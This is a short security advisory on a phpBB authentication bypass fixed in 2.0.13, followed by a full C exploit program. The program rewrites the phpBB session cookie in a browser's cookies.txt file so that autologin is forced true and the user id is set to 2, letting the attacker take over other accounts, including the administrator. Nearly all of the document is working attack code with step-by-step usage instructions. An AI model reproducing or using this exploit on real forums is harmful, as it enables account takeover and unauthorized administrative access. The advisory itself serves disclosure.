source: http://www.securityfocus.com/bid/12678/info

phpBB is affected by an authentication bypass vulnerability.

This issue is due to the application failing to properly sanitize user-supplied input during authentication.

Exploitation of this vulnerability would permit unauthorized access to any known account including the administrator account.

The vendor has addressed this issue in phpBB 2.0.13. 

/*
Author: Paisterist
Date: 28-02-05
[N]eo [S]ecurity [T]eam ©

Description: this exploit modify the user id that is in your
cookies.txt (Firefox and Mozilla) file.
You have to log in the forum, with the autologin option unchecked,
then you close the navigator and
execute the exploit.
If you have any problem with the exploit, remove all cookies and do all 
again.

Note: you have to put the exploit in the same directory of cookies.txt.
This exploit overwrite all phpbb cookies that have the user id 
specified.

I HAVE NOT DISCOVERED THIS VULNERABILITY, I DON'T KNOW WHO HAS 
DISCOVERED IT.

By Paisterist

http://neosecurityteam.net
http://neosecurityteam.tk

Greetz: Hackzatan, Crashcool, Towner, Daemon21, Wokkko, Maxx, 
Arcanhell, Alluz.
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char** argv[]) {
FILE *pointer;
char contenido[10000],

cookie[91]="a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0
%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%22",
cookief[9]="%22%3B%7D", cookiec[106],

cookie_false[92]="a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb
%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D",
*pos;
int p=0, i=0;

if (argc!=2) {
printf("Usage: phpbb_exploit.exe user_id\n\n");
exit(0);
}
pointer=fopen("cookies.txt", "r");

if (pointer) {
fread(contenido, 300, 10, pointer);
fclose(pointer);
} else {
printf("The file can't be open\n");
exit(0);
}

strcpy(cookiec, cookie);
strncat(cookiec, argv[1], 6);
strcat(cookiec, cookief);

if (pos=strstr(contenido, cookiec)) {
p=pos - contenido;
while (i<92) {
if (cookie_false[i]!=NULL) 
contenido[p]=cookie_false[i];
p++;
i++;
}
}
else {
printf("The file cookies.txt isn't valid for execute the
exploit or the user id is incorrect\n");
exit(0);
}

if (pointer=fopen("cookies.txt", "w")) {
fputs(contenido, pointer);
printf("Cookie modified: \n\n%s\n\n", contenido);
printf("The cookies file has overwriten... looks like the exploit has worked");
} else printf("\n\nThe file cookies.txt has not write permissions.");
return 0;
}

 